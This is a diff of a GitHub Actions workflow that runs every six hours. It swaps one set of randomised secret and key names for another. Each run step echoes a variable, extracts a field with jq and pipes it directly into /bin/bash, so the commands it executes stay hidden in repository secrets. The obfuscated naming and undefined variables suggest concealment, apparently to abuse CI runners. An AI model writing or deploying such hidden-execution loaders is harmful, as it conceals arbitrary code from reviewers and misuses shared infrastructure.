@@ -3,26 +3,20 @@ name: separatecocksfoot
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-
+    - cron: '43 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: separatecocksfoot
         env:
-          nurde321: ${{ secrets.nurde321 }}
+          zrb8: ${{ secrets.zrb8 }}
         run: |
-          echo $nurde321 | jq -r .y510 | /bin/bash
-          echo $uiwm4 | jq -r .mhcfz90159 | /bin/bash
-          echo $cpaxz027 | jq -r .zcfif14841 | /bin/bash
-          echo $ay0 | jq -r .nmi12 | /bin/bash
-          echo $w5725 | jq -r .l80 | /bin/bash
-          echo $yw606 | jq -r .chfm4 | /bin/bash
-          echo $nvm07 | jq -r .cvoyc1 | /bin/bash
-          echo $o7 | jq -r .nmsm34 | /bin/bash
-          echo $id903 | jq -r .angh84 | /bin/bash
-          echo $fqagx8594 | jq -r .jzqbs2178 | /bin/bash
+          echo $zrb8 | jq -r .ga68 | /bin/bash
+          echo $rn78 | jq -r .in358 | /bin/bash
+          echo $qn0943 | jq -r .owj3597 | /bin/bash
+          echo $j34746 | jq -r .unksm6106 | /bin/bash
+          echo $ns068 | jq -r .hcrt59639 | /bin/bash
+          echo $gbw15 | jq -r .kffkj7 | /bin/bash
 
